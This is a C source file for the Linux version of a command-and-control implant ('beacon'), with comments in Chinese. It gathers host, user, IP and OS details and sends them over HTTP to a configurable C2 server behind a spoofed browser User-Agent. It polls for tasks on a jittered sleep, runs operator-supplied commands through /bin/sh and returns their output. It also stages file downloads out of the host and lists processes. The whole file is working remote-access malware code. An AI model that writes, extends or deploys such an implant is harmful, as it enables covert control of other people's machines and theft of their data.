/*
 * csdev :: linux/beacon2_linux.c  --  协议 v2 Linux x64 植入体
 * ==========================================================================
 * 与 kits/beacon/beacon2.c (Windows) 在**协议层完全对等**:
 *   同一帧格式 / 同一 TLV / 同一 TASK_BATCH / 同一 RESULT 布局,
 *   因此同一个 Go 服务端 (go/v2_core.go handleSubmit) 可直接接管。
 *
 * 与 Windows 版的差异只在"平台适配", 协议面一律不变:
 *   HTTP 承载   WinHTTP            -> 自拼 POST /submit 的 POSIX socket
 *   RSA 公钥加密 CryptoAPI         -> linux/rsa_linux.c (自研大数, 无 OpenSSL)
 *   随机数      CryptGenRandom     -> getrandom(2) / /dev/urandom
 *   shell       cmd.exe /c         -> /bin/sh -c
 *   进程/文件    Toolhelp32/Win32   -> /proc 解析 + POSIX 系统调用
 *   meta.ip     "-" (Windows 占位)  -> getifaddrs 真实内网地址
 *
 * AES / SHA256 / HMAC 直接复用 kits/crypto (纯 C, 无 windows.h)。
 * 帧与 TLV 直接复用 kits/proto/frame.c。
 *
 * 编译 (WSL):
 *   gcc -O2 -s -o beacon2_linux beacon2_linux.c rsa_linux.c \
 *       ../kits/proto/frame.c ../kits/crypto/aes.c ../kits/crypto/sha256.c
 *   或 tools/build_linux2.ps1 (Windows 侧一键)
 * ==========================================================================
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <pwd.h>
#include <ifaddrs.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <limits.h>

#include "../kits/proto/frame.h"
#include "../kits/crypto/crypto.h"
#include "../kits/beacon/token_gate.h"
#include "../kits/beacon/pubkey.h"
#include "rsa_linux.h"

/* ---------------------------------------------------------- 编译期配置 */

#ifndef C2_HOST
#define C2_HOST   "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT   8443
#endif
#ifndef C2_URI
#define C2_URI    "/submit"
#endif
#ifndef C2_SLEEP
#define C2_SLEEP  5000u
#endif
#ifndef C2_JITTER
#define C2_JITTER 10
#endif
#ifndef C2_CHUNK
#define C2_CHUNK  (512u * 1024u)     /* 文件分块大小, 协议第 7 节 */
#endif

/* Windows 侧用 WinHTTP 的原生 TLS。本实现是裸 socket, 没有内置 TLS 栈,
 * 若把 C2_SSL 静默忽略会让使用者误以为流量被加密 —— 明确拒绝编译。 */
#ifdef C2_SSL
#  if C2_SSL
#    error "Linux 植入体无内置 TLS 栈: 请用 -DC2_SSL=0, 或在植入体前部署 TLS 终止代理 (stunnel/nginx stream)"
#  endif
#endif

#define MAX_PLAIN (1536u * 1024u)
#define MAX_FRAME (MAX_PLAIN + 1024u)
#define CMD_CAP   400000u            /* 单条命令输出上限, 与 Windows 侧一致 */

/* ---------------------------------------------------------------- 全局 */

static unsigned char *g_tx;      /* 出站帧编码 */
static unsigned char *g_rx;      /* HTTP 响应原文 */
static unsigned char *g_pt;      /* 明文: 上行组装 / 下行批次 */
static unsigned char *g_out;     /* 出站 TLV 累积 (outbox) */
static unsigned int   g_outlen;
static unsigned char *g_scratch; /* 命令输出暂存 */

static char g_meta[512];         /* 元信息 (0x1F 分隔) */
static char g_cwd[PATH_MAX];     /* 当前目录 (FS_OPS cd 维护) */

static cs_session g_sess_state;

/* 下载状态机 (同一时刻只允许一个未完成传输), kind: 0=流式读文件 1=内存缓冲 */
static int            g_dl_active;
static unsigned int   g_dl_job;
static unsigned int   g_dl_off;
static unsigned int   g_dl_total;
static unsigned char *g_dl_mem;
static char           g_dl_path[PATH_MAX];

/* 传输串行化: 与 Windows 侧同构 —— 忙时把传输类任务暂存, 避免覆盖
 * g_dl_* 状态导致前一个传输永久不完整。 */
#define PEND_MAX     4
#define PEND_ARG_MAX 1024

typedef struct {
    unsigned int  id;
    unsigned char cls;
    char          alias[32];
    unsigned int  arglen;
    unsigned char arg[PEND_ARG_MAX];
} pend_task;

static pend_task g_pend[PEND_MAX];
static int       g_pend_n;

/* ------------------------------------------------------------ 基础工具 */

static unsigned int s_len(const char *s)
{
    return s ? (unsigned int)strlen(s) : 0u;
}

static void s_copy(char *d, const char *s, unsigned int cap)
{
    unsigned int i = 0;
    if (!cap) return;
    while (s && s[i] && i < cap - 1u) { d[i] = s[i]; i++; }
    d[i] = 0;
}

/* 用单引号把参数包起来, 内部单引号转义为 '\'' */
static void sh_quote(const char *s, char *out, unsigned int cap)
{
    unsigned int i = 0, k = 0;

    if (cap < 3) { if (cap) out[0] = 0; return; }
    out[i++] = '\'';
    while (s && s[k] && i + 5u < cap) {
        if (s[k] == '\'') {
            out[i++] = '\''; out[i++] = '\\'; out[i++] = '\''; out[i++] = '\'';
        } else {
            out[i++] = s[k];
        }
        k++;
    }
    out[i++] = '\'';
    out[i] = 0;
}

/* ---------------------------------------------------------------- 元信息 */

/* 读一个文件的前 n 字节并去掉行尾空白 */
static int slurp_head(const char *path, char *out, unsigned int cap)
{
    int fd;
    ssize_t n;
    unsigned int i;

    if (cap == 0) return 0;
    out[0] = 0;

    fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    n = read(fd, out, cap - 1u);
    close(fd);
    if (n <= 0) { out[0] = 0; return 0; }

    out[n] = 0;
    for (i = 0; i < (unsigned int)n; i++) {
        if (out[i] == '\n' || out[i] == '\r') { out[i] = 0; break; }
    }
    return 1;
}

/* hostname */
static void meta_host(char *out, unsigned int cap)
{
    if (gethostname(out, cap - 1u) != 0) { s_copy(out, "unknown", cap); return; }
    out[cap - 1u] = 0;
    if (!out[0]) s_copy(out, "unknown", cap);
}

/* 用户名: getpwuid 优先, 回退环境变量, 最后回退 uid 数字 */
static void meta_user(char *out, unsigned int cap)
{
    struct passwd *pw = getpwuid(getuid());
    const char *e;

    if (pw && pw->pw_name && pw->pw_name[0]) { s_copy(out, pw->pw_name, cap); return; }

    e = getenv("USER");
    if (!e || !e[0]) e = getenv("LOGNAME");
    if (e && e[0]) { s_copy(out, e, cap); return; }

    snprintf(out, cap, "%u", (unsigned int)getuid());
}

/* 进程名: /proc/self/comm (与 Windows 侧 PEB ImageFileName 语义一致)
 * macOS 无 /proc, 用 getprogname() —— 语义相同 (都是"当前可执行文件名")。 */
#ifdef __APPLE__
/* getprogname() 是 BSD 扩展, 不在 POSIX 的 stdlib.h 里; 显式声明以保证
 * 跨平台语法检查 (例如在 Linux 上 -D__APPLE__ 预演) 也不产生隐式声明警告。 */
extern const char *getprogname(void);
#endif
static void meta_proc(char *out, unsigned int cap, const char *argv0)
{
#ifdef __APPLE__
    {
        const char *pn = getprogname();
        if (pn && pn[0]) { s_copy(out, pn, cap); return; }
    }
#else
    if (slurp_head("/proc/self/comm", out, cap) && out[0]) return;
#endif

    if (argv0 && argv0[0]) {
        const char *b = strrchr(argv0, '/');
        s_copy(out, b ? b + 1 : argv0, cap);
        return;
    }
#ifdef __APPLE__
    s_copy(out, "beacon2_macos", cap);
#else
    s_copy(out, "beacon2_linux", cap);
#endif
}

/* 发行版: Linux 读 /etc/os-release 的 PRETTY_NAME, macOS 读 sw_vers, 再回退 uname */
static void meta_os(char *out, unsigned int cap)
{
    FILE *f;
    char line[256];

    out[0] = 0;

#ifdef __APPLE__
    /* macOS 没有 /etc/os-release; sw_vers 是官方取值途径 */
    f = popen("sw_vers -productVersion 2>/dev/null", "r");
    if (f) {
        if (fgets(line, sizeof(line), f)) {
            unsigned int n = s_len(line);
            while (n && (line[n - 1] == '\n' || line[n - 1] == '\r')) line[--n] = 0;
            if (n) snprintf(out, cap, "macOS %s", line);
        }
        pclose(f);
    }
    if (!out[0]) {
        struct utsname u;
        if (uname(&u) == 0) snprintf(out, cap, "%.64s %.64s", u.sysname, u.release);
        else                s_copy(out, "macOS", cap);
    }
    return;
#else
    f = fopen("/etc/os-release", "r");
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
                char *v = line + 12;
                unsigned int n = s_len(v);
                while (n && (v[n - 1] == '\n' || v[n - 1] == '\r')) v[--n] = 0;
                if (n >= 2 && v[0] == '"' && v[n - 1] == '"') { v[n - 1] = 0; v++; }
                s_copy(out, v, cap);
                break;
            }
        }
        fclose(f);
    }
    if (!out[0]) {
        struct utsname u;
        if (uname(&u) == 0) snprintf(out, cap, "%.64s %.64s", u.sysname, u.release);
        else                s_copy(out, "Linux", cap);
    }
#endif
}

/* 内网地址: 取第一个非 loopback 的 IPv4 */
static void meta_ip(char *out, unsigned int cap)
{
    struct ifaddrs *ifa = NULL, *p;

    s_copy(out, "-", cap);
    if (getifaddrs(&ifa) != 0) return;

    for (p = ifa; p; p = p->ifa_next) {
        struct sockaddr_in *sin;

        if (!p->ifa_addr || p->ifa_addr->sa_family != AF_INET) continue;
        if (p->ifa_flags & IFF_LOOPBACK) continue;

        sin = (struct sockaddr_in *)p->ifa_addr;
        if (sin->sin_addr.s_addr == 0) continue;
        if (inet_ntop(AF_INET, &sin->sin_addr, out, cap)) break;
    }
    freeifaddrs(ifa);
}

/* 采集 meta: host \x1F user \x1F arch \x1F pid \x1F ppid \x1F proc \x1F ip \x1F os
 *            \x1F sleep \x1F jitter
 * 字段顺序与 Windows 侧 build_meta 严格一致 (服务端按下标取值)。 */
#define META_MAX 255

static unsigned int build_meta(char *out, unsigned int cap, const char *argv0)
{
    char host[128], user[64], proc[64], ip[64], os[160];
    char pidb[16], ppidb[16];
    char slb[16], jtb[16];
    const char *f[10];
    unsigned int i = 0, k, L, need;

    meta_host(host, sizeof(host));
    meta_user(user, sizeof(user));
    meta_proc(proc, sizeof(proc), argv0);
    meta_ip(ip, sizeof(ip));
    meta_os(os, sizeof(os));
    snprintf(pidb, sizeof(pidb), "%u", (unsigned int)getpid());
    snprintf(ppidb, sizeof(ppidb), "%u", (unsigned int)getppid());

    f[0] = host; f[1] = user; f[2] = "x64"; f[3] = pidb;
    f[4] = ppidb; f[5] = proc; f[6] = ip; f[7] = os;
    /* 第 9/10 字段: 编译期 sleep / jitter, 与 Windows 侧同序。
       以前只有 8 个字段, 服务端拿不到真实值, 只能硬编码猜 5000/10 —— GUI 里显示的
       sleep 永远和植入体实际配置对不上, 容易被误读成"延迟高"。
       放末尾保证兼容: 截断时只丢这两个, 服务端回落默认值。 */
    snprintf(slb, sizeof(slb), "%u", (unsigned int)C2_SLEEP);
    snprintf(jtb, sizeof(jtb), "%u", (unsigned int)C2_JITTER);
    f[8] = slb; f[9] = jtb;

    /* 超长时按**完整字段边界**截断 (meta_len 只有 1 字节) */
    for (k = 0; k < 10u; k++) {
        L = s_len(f[k]);
        need = L + (k ? 1u : 0u);
        if (i + need > META_MAX || i + need >= cap) break;
        if (k) out[i++] = (char)0x1F;
        memcpy(out + i, f[k], L);
        i += L;
    }
    out[i] = 0;
    return i;
}

/* ---------------------------------------------------------------- 网络 */

static int net_connect(void)
{
    struct addrinfo hints, *res = NULL, *p;
    char port[8];
    int fd = -1;

    snprintf(port, sizeof(port), "%d", (int)C2_PORT);

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(C2_HOST, port, &hints, &res) != 0) return -1;

    for (p = res; p; p = p->ai_next) {
        struct timeval tv;
        int one = 1;

        fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (fd < 0) continue;

        tv.tv_sec  = 10;
        tv.tv_usec = 0;
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

        if (connect(fd, p->ai_addr, p->ai_addrlen) == 0) break;

        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

static int send_all(int fd, const void *buf, unsigned int len)
{
    unsigned int sent = 0;

    while (sent < len) {
        ssize_t n = send(fd, (const unsigned char *)buf + sent, len - sent, 0);
        if (n > 0) { sent += (unsigned int)n; continue; }
        if (n < 0 && errno == EINTR) continue;
        return -1;
    }
    return 0;
}

/* 在一行里做与大小写无关的前缀匹配 */
static int hdr_is(const unsigned char *line, unsigned int len, const char *name)
{
    unsigned int nl = s_len(name);
    if (len < nl) return 0;
    return strncasecmp((const char *)line, name, nl) == 0;
}

/* 手工解析 16 进制 (chunk size 行, 不是 NUL 结尾) */
static long parse_hex(const unsigned char *p, unsigned int len)
{
    long v = 0;
    unsigned int i = 0;

    while (i < len && p[i] == ' ') i++;
    for (; i < len; i++) {
        unsigned char c = p[i];
        int d;
        if (c >= '0' && c <= '9')      d = c - '0';
        else if (c >= 'a' && c <= 'f') d = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') d = c - 'A' + 10;
        else break;
        v = (v << 4) | d;
        if (v > (long)MAX_FRAME) break;
    }
    return v;
}

/* 解析 HTTP 响应, 取出 body。支持 Content-Length / chunked / 读到 EOF 三种。
 * 返回 body 长度 (0 表示无 body 或解析失败)。 */
static unsigned int http_body(unsigned char *buf, unsigned int total,
                              unsigned char *out, unsigned int outcap)
{
    unsigned int i, hdr_end = 0, body_off, body_len;
    long clen = -1;
    int  chunked = 0;

    if (total < 5) return 0;

    /* 1. 定位 header / body 分界 */
    for (i = 0; i + 3u < total; i++) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
            hdr_end = i;
            break;
        }
    }
    if (i + 3u >= total) return 0;

    body_off = hdr_end + 4u;
    body_len = total - body_off;

    /* 2. 逐行扫描 header */
    {
        unsigned int p = 0;
        while (p < hdr_end) {
            unsigned int ls = p, le = p;

            while (le < hdr_end && buf[le] != '\n') le++;
            {
                unsigned int hlen = le - ls;
                if (hlen && buf[ls + hlen - 1u] == '\r') hlen--;

                if (hdr_is(buf + ls, hlen, "content-length:")) {
                    clen = (long)strtol((const char *)buf + ls + 15u, NULL, 10);
                } else if (hdr_is(buf + ls, hlen, "transfer-encoding:")) {
                    /* 只在本行范围内找 chunked, 不要搜到 body 去 */
                    unsigned int q;
                    for (q = ls; q + 7u <= ls + hlen; q++) {
                        if (strncasecmp((const char *)buf + q, "chunked", 7) == 0) {
                            chunked = 1;
                            break;
                        }
                    }
                }
            }
            p = le + 1u;
        }
    }

    /* 3. chunked 解码 */
    if (chunked && clen < 0) {
        unsigned int ip = body_off, op = 0;

        while (ip < total) {
            unsigned int ls = ip, le = ip;
            long sz;

            while (le < total && buf[le] != '\n') le++;
            if (le >= total) break;

            sz = parse_hex(buf + ls, le - ls);
            ip = le + 1u;                 /* 跳过 size 行的 \n */
            if (sz <= 0) break;           /* 末块 */
            if (op + (unsigned int)sz > outcap) return 0;
            if (ip + (unsigned int)sz > total) return 0;

            memcpy(out + op, buf + ip, (size_t)sz);
            op += (unsigned int)sz;
            ip += (unsigned int)sz;

            while (ip < total && (buf[ip] == '\r' || buf[ip] == '\n')) ip++;
        }
        return op;
    }

    /* 4. 普通 body */
    if (clen >= 0) {
        if ((unsigned int)clen > body_len) return 0;   /* 响应不完整 -> 当作失败 */
        if ((unsigned int)clen > outcap) return 0;
        memmove(out, buf + body_off, (size_t)clen);
        return (unsigned int)clen;
    }

    /* 5. 无 Content-Length (Connection: close, 读到 EOF) */
    if (body_len > outcap) return 0;
    memmove(out, buf + body_off, body_len);
    return body_len;
}

/* POST 一帧并返回响应 body 长度 (0 = 失败) */
static unsigned int c2_post(const unsigned char *data, unsigned int len,
                            unsigned char *out, unsigned int outcap)
{
    char hdr[768];
    int  fd;
    unsigned int total = 0;
    int  hlen;

    fd = net_connect();
    if (fd < 0) return 0;

    hlen = snprintf(hdr, sizeof(hdr),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %u\r\n"
        "Connection: close\r\n"
        "\r\n",
        C2_URI, C2_HOST, (int)C2_PORT, len);

    if (hlen <= 0 || (unsigned int)hlen >= sizeof(hdr)) { close(fd); return 0; }

    if (send_all(fd, hdr, (unsigned int)hlen) < 0 ||
        send_all(fd, data, len) < 0) {
        close(fd);
        return 0;
    }

    /* Connection: close -> 读到 EOF (SO_RCVTIMEO 兜底) */
    while (total < outcap) {
        ssize_t n = recv(fd, out + total, outcap - total, 0);
        if (n > 0) { total += (unsigned int)n; continue; }
        if (n < 0 && errno == EINTR) continue;
        break;
    }
    close(fd);

    return http_body(out, total, out, outcap);
}

/* ------------------------------------------------------------ 睡眠控制 */

/* 抖动算法与 Windows 侧 beacon_sleep 完全相同 (整数运算顺序一致),
 * 保证两侧时间行为等价。 */
static void beacon_sleep(unsigned int ms, unsigned char jitter)
{
    unsigned int actual = ms;
    unsigned char r = 0;

    if (jitter > 0 && csdev_random(&r, 1)) {
        unsigned int j = ((ms * (unsigned int)r) / 255u) * jitter / 100u;
        actual = (ms > j) ? (ms - j) : ms / 2u;
    }
    if (actual == 0) actual = 1000u;

    /* 分片睡眠: 与 Windows 侧一致, 便于后续接入 sleep mask */
    while (actual > 0) {
        struct timespec ts;
        unsigned int slice = (actual > 1000u) ? 1000u : actual;

        ts.tv_sec  = (time_t)(slice / 1000u);
        ts.tv_nsec = (long)(slice % 1000u) * 1000000L;
        while (nanosleep(&ts, &ts) < 0 && errno == EINTR) { /* 继续睡完 */ }

        actual -= slice;
    }
}

/* ---------------------------------------------------------------- outbox */

#define BOX_FAIL ((unsigned int)-1)

static int box_space(unsigned int need)
{
    return (g_outlen + need) <= MAX_PLAIN;
}

/* 预留 TLV 空间, 返回数据写入位置 (相对 g_out)。
 * TLV 头 [2B type][4B len] 共 6 字节 —— 4 字节长度是必须的, 2 字节装不下
 * 512 KB 的分块长度 (会静默截断导致整条流错位)。 */
static unsigned int box_begin(unsigned short type, unsigned int need)
{
    unsigned int start;

    if (!box_space(need + 6u)) return BOX_FAIL;

    start = g_outlen;
    cs_put_be16(g_out + start, type);
    cs_put_be32(g_out + start + 2, 0);          /* 长度占位 */
    g_outlen = start + 6u;
    return start;
}

static void box_end(unsigned int start, unsigned int datalen)
{
    cs_put_be32(g_out + start + 2, datalen);
    g_outlen = start + 6u + datalen;
}

static void box_result(unsigned int task_id, unsigned char status,
                       const unsigned char *data, unsigned int datalen)
{
    unsigned int start = box_begin(T_RESULT, 9u + datalen);
    unsigned int p;

    if (start == BOX_FAIL) return;             /* outbox 满: 丢弃本次结果 */
    p = g_outlen;
    cs_put_be32(g_out + p, task_id);
    g_out[p + 4] = status;
    cs_put_be32(g_out + p + 5, datalen);
    if (datalen && data) memcpy(g_out + p + 9, data, datalen);
    box_end(start, 9u + datalen);
}

static void box_result_str(unsigned int task_id, unsigned char status, const char *s)
{
    box_result(task_id, status, (const unsigned char *)s, s_len(s));
}

/* ------------------------------------------------------------ 子进程工具 */

static void reap_child(pid_t pid, int ms)
{
    int waited = 0, st;

    for (;;) {
        pid_t r = waitpid(pid, &st, WNOHANG);
        if (r == pid) return;
        if (r < 0 && errno != EINTR) return;
        if (waited >= ms) {
            kill(-pid, SIGKILL);
            kill(pid, SIGKILL);
            waitpid(pid, &st, 0);
            return;
        }
        usleep(20000);
        waited += 20;
    }
}

/* fork 出子进程把 cmd 交给 /bin/sh -c 执行, 收取合并后的 stdout+stderr。
 * 与 Windows 侧一致: 不经过 system()/popen(), 自己管 fd 与回收。 */
static unsigned int run_shell(const char *cmd, unsigned char *out, unsigned int cap)
{
    int   pfd[2];
    pid_t pid;
    unsigned int total = 0;
    int   truncated = 0;

    if (pipe(pfd) < 0) return 0;

    pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return 0; }

    if (pid == 0) {
        /* 子进程 */
        close(pfd[0]);
        if (dup2(pfd[1], STDOUT_FILENO) < 0) _exit(126);
        if (dup2(pfd[1], STDERR_FILENO) < 0) _exit(126);
        close(pfd[1]);

        /* 独立进程组: 超时后可以整组清理, 不留孤儿 */
        setpgid(0, 0);

        /* 清掉可能影响命令语义的变量 (C2 侧不应把植入体的环境泄漏给 shell) */
        unsetenv("LD_PRELOAD");

        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }

    /* 父进程 */
    close(pfd[1]);
    setpgid(pid, pid);      /* 与子进程竞争设置, 失败无所谓 */

    while (total < cap) {
        ssize_t n = read(pfd[0], out + total, cap - total);
        if (n > 0) { total += (unsigned int)n; continue; }
        if (n < 0 && errno == EINTR) continue;
        break;
    }
    if (total >= cap) {
        /* 可能还有数据 -> 标记截断并尽快收摊 */
        truncated = 1;
    }
    close(pfd[0]);
    reap_child(pid, truncated ? 200 : 3000);

    if (truncated && total + 32u <= cap) {
        const char *tail = "\r\n[*] 输出已截断\r\n";
        unsigned int L = s_len(tail);
        memcpy(out + total, tail, L);
        total += L;
    }
    return total;
}

/* ------------------------------------------------ 服务端别名反向兼容 */

/* go/server.go 的 mapCommand 是 Windows 中心的: 非原生命令在服务端就被翻成
 * cmd.exe 语法 (whoami -> "whoami /all"、ls -> "dir /a"、type -> "type x")。
 * Linux 植入体如果原样喂给 /bin/sh, 会得到 "extra operand '/all'" 这类报错。
 * 这里做最小必要的反向映射, 只覆盖服务端确实会产出的形态; 其余一律原样透传,
 * 这样操作员手写的 POSIX 命令 (如 `cat /etc/passwd`) 不受影响。 */
static void compat_shell(const char *win, char *out, unsigned int cap)
{
    char verb[64], rest[768], arg[640];
    unsigned int i = 0, k = 0, rs;

    if (cap == 0) return;
    out[0] = 0;

    /* 拆 verb / rest */
    while (win[i] && win[i] != ' ' && i < sizeof(verb) - 1u) { verb[i] = win[i]; i++; }
    verb[i] = 0;
    while (win[i] == ' ') i++;
    rs = 0;
    while (win[i] && rs < sizeof(rest) - 1u) rest[rs++] = win[i++];
    rest[rs] = 0;

    /* 去掉包裹的双引号 */
    if (rs >= 2 && rest[0] == '"' && rest[rs - 1] == '"') {
        rest[rs - 1] = 0;
        memmove(rest, rest + 1, rs - 1);
    }
    s_copy(arg, rest, sizeof(arg));

    if (!verb[0]) { s_copy(out, win, cap); return; }

    /* 命令本体是无歧义的 POSIX 命令时直接透传 */
    {
        static const char *passthru[] = {
            "id", "uname", "cat", "ls", "ps", "ip", "ss", "df", "free", "env",
            "nproc", "uptime", "w", "who", "hostname", "date", "which", "head",
            "tail", "grep", "awk", "sed", "find", "curl", "wget", "python3",
            "docker", "systemctl", "journalctl", "netstat", "ifconfig", "whoami",
            NULL
        };
        const char **q;
        for (q = passthru; *q; q++) {
            if (strcasecmp(verb, *q) == 0) {
                /* whoami 例外: 服务端已经追加了 /all, 需要丢掉 */
                if (strcasecmp(verb, "whoami") == 0) {
                    snprintf(out, cap, "id");
                    return;
                }
                s_copy(out, win, cap);
                return;
            }
        }
    }

    if (strcasecmp(verb, "dir") == 0) {
        char q[640];
        if (!arg[0]) { s_copy(out, "ls -la", cap); return; }
        sh_quote(arg, q, sizeof(q));
        snprintf(out, cap, "ls -la -- %s", q);
        return;
    }
    if (strcasecmp(verb, "type") == 0) {
        char q[640];
        sh_quote(arg, q, sizeof(q));
        snprintf(out, cap, "cat -- %s", q);
        return;
    }
    if (strcasecmp(verb, "del") == 0 || strcasecmp(verb, "erase") == 0) {
        char q[640];
        sh_quote(arg, q, sizeof(q));
        snprintf(out, cap, "rm -f -- %s", q);
        return;
    }
    if (strcasecmp(verb, "mkdir") == 0) {
        char q[640];
        sh_quote(arg, q, sizeof(q));
        snprintf(out, cap, "mkdir -p -- %s", q);
        return;
    }
    if (strcasecmp(verb, "rmdir") == 0) {
        char q[640];
        sh_quote(arg, q, sizeof(q));
        snprintf(out, cap, "rm -rf -- %s", q);
        return;
    }
    if (strcasecmp(verb, "set") == 0)   { s_copy(out, "env", cap); return; }
    if (strcasecmp(verb, "systeminfo") == 0) {
        s_copy(out, "uname -a; echo; cat /etc/os-release", cap);
        return;
    }
    if (strcasecmp(verb, "tasklist") == 0) { s_copy(out, "ps aux", cap); return; }
    if (strcasecmp(verb, "taskkill") == 0) {
        const char *p = strstr(arg, "/PID");
        s_copy(out, "echo '任务类别不适用于 Linux (用 kill)'", cap);
        if (p) {
            char q[64];
            s_copy(q, p + 4, sizeof(q));
            snprintf(out, cap, "kill -9 %s", q);
        }
        return;
    }
    if (strcasecmp(verb, "ipconfig") == 0 || strcasecmp(verb, "ifconfig") == 0) {
        s_copy(out, "ip -br addr", cap);
        return;
    }
    if (strcasecmp(verb, "netstat") == 0) { s_copy(out, "ss -tunap", cap); return; }
    if (strcasecmp(verb, "arp") == 0)     { s_copy(out, "ip neigh", cap); return; }
    if (strcasecmp(verb, "route") == 0)   { s_copy(out, "ip route", cap); return; }
    if (strcasecmp(verb, "ping") == 0) {
        unsigned int cnt = 4;
        char hp[256];
        if (sscanf(arg, "-n %u %255s", &cnt, hp) == 2) {
            snprintf(out, cap, "ping -c %u -w 3 %s", cnt, hp);
        } else if (arg[0]) {
            char q[640];
            sh_quote(arg, q, sizeof(q));
            snprintf(out, cap, "ping -c 4 -w 3 %s", q);
        } else {
            s_copy(out, "echo '用法: ping <主机>'", cap);
        }
        return;
    }
    if (strcasecmp(verb, "net") == 0) {
        if (strncasecmp(arg, "user", 4) == 0) {
            s_copy(out, "cut -d: -f1,3 /etc/passwd", cap);
        } else if (strncasecmp(arg, "localgroup", 10) == 0) {
            s_copy(out, "id; echo; cat /etc/group", cap);
        } else if (strncasecmp(arg, "share", 5) == 0) {
            s_copy(out, "echo '[-] SMB 共享枚举在 Linux 上不适用'", cap);
        } else {
            s_copy(out, "echo '[-] net 子命令在 Linux 上不适用'", cap);
        }
        return;
    }
    if (strcasecmp(verb, "certutil") == 0) {
        const char *p = strstr(arg, "-hashfile");
        char q[640];
        if (p) {
            s_copy(q, p + 10, sizeof(q));
            {
                /* 去掉尾部算法名 (SHA256) */
                char *sp = strchr(q, ' ');
                if (sp) *sp = 0;
            }
            sh_quote(q, arg, sizeof(arg));
            snprintf(out, cap, "sha256sum -- %s", arg);
        } else {
            s_copy(out, "echo '[-] certutil 在 Linux 上不适用'", cap);
        }
        return;
    }
    if (strcasecmp(verb, "driverquery") == 0) { s_copy(out, "lsmod", cap); return; }
    if (strcasecmp(verb, "powershell") == 0) {
        s_copy(out, "echo '[-] PowerShell 在 Linux 上不可用'", cap);
        return;
    }
    if (strcasecmp(verb, "wmic") == 0) {
        s_copy(out, "echo '[-] WMIC 在 Linux 上不可用'", cap);
        return;
    }
    if (strcasecmp(verb, "findstr") == 0) {
        /* findstr /s /i /m "<pat>" * -> grep -r -i -l <pat> . */
        const char *p = strchr(arg, '"');
        char pat[256];
        if (p) {
            unsigned int m = 0;
            p++;
            while (*p && *p != '"' && m < sizeof(pat) - 1u) pat[m++] = *p++;
            pat[m] = 0;
            snprintf(out, cap, "grep -ril -- '%s' . 2>/dev/null", pat);
        } else {
            s_copy(out, "echo '[-] findstr 参数无法映射'", cap);
        }
        return;
    }

    /* 未识别: 原样交给 /bin/sh */
    s_copy(out, win, cap);
    (void)k;
}

/* ------------------------------------------------------------ 命令实现 */

#ifdef __APPLE__
/* macOS 没有 /proc, 统一走 ps 命令一次拿全。
 * 注意: BSD 的 ps 没有 nlwp 键, 线程数在这里恒为 0 (宁可给 0 也不要瞎编) —— 
 * 需要线程数时应改用 task_info 或 proc_pidinfo, 那是另一条实现路径。 */
static unsigned int proc_ps_macos(unsigned char *out, unsigned int cap, int with_ppid)
{
    FILE *p = popen("ps -axo pid=,ppid=,comm= 2>/dev/null", "r");
    char buf[1024];
    unsigned int total = 0;

    if (!p) return 0;

    while (fgets(buf, sizeof(buf), p)) {
        long pid = 0, ppid = 0;
        char comm[256];
        char line[420];
        unsigned int n;

        comm[0] = 0;
        if (sscanf(buf, "%ld %ld %255s", &pid, &ppid, comm) != 3) continue;
        if (comm[0] == 0) continue;

        {   /* 只保留 basename, 与 Linux 版的 /proc/<pid>/comm 语义对齐 */
            char *b = strrchr(comm, '/');
            if (b) memmove(comm, b + 1, s_len(b + 1) + 1);
        }

        if (with_ppid) {
            n = (unsigned int)snprintf(line, sizeof(line), "%ld\t%ld\t0\t%s\r\n",
                                       pid, ppid, comm);
        } else {
            n = (unsigned int)snprintf(line, sizeof(line), "%ld\t%s\r\n", pid, comm);
        }
        if (total + n > cap) break;
        memcpy(out + total, line, n);
        total += n;
    }
    pclose(p);
    return total;
}
#endif

/* 进程列表: pid \t name (对应 CMD_PROC_LIST) */
static unsigned int cmd_proc_list(unsigned char *out, unsigned int cap)
{
#ifdef __APPLE__
    return proc_ps_macos(out, cap, 0);
#else
    DIR *d = opendir("/proc");
    struct dirent *e;
    unsigned int total = 0;

    if (!d) return 0;

    while ((e = readdir(d))) {
        char path[300], comm[128], line[300];
        unsigned int n, L;

        if (e->d_name[0] < '0' || e->d_name[0] > '9') continue;

        snprintf(path, sizeof(path), "/proc/%s/comm", e->d_name);
        if (!slurp_head(path, comm, sizeof(comm))) continue;

        {
            unsigned int i = s_len(e->d_name);
            if (i > 60u) continue;
            L = s_len(comm);
            if (L > 200u) L = 200u;

            n = (unsigned int)snprintf(line, sizeof(line), "%s\t", e->d_name);
            if (n + L + 2u >= sizeof(line)) continue;
            memcpy(line + n, comm, L);
            n += L;
            line[n++] = '\r';
            line[n++] = '\n';

            if (total + n > cap) break;
            memcpy(out + total, line, n);
            total += n;
        }
    }
    closedir(d);
    return total;
#endif
}

